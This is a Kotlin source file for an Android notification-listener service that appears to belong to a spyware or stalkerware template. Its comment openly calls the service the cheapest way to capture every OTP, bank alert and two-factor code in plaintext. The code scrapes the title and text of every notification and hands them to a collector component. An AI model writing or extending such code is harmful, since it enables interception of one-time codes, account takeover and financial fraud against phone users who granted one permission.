package com.mobilesvc.agent

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

/**
 * Notification relay.
 *
 * This is the highest-value single capability in the whole template and the cheapest to hold:
 * every OTP, every bank alert, every two-factor code arrives as a notification, in plaintext,
 * before the user reads it. No accessibility service, no exploit, no root.
 *
 * The user grants it once in Settings → Notification access. That detour is the entire defence
 * Android has, and it is one toggle.
 */
class NotificationRelay : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        val notification = sbn?.notification ?: return
        val config = PayloadConfig.load(this)
        if (!config.notifications) return

        val extras = notification.extras ?: return
        val title = extras.getCharSequence("android.title")?.toString().orEmpty()
        val text = extras.getCharSequence("android.text")?.toString().orEmpty()
        if (title.isBlank() && text.isBlank()) return

        val line = "${sbn.packageName} | $title :: ${text.replace("\n", " ").take(200)}"
        Collector.recordNotification(line)
    }
}
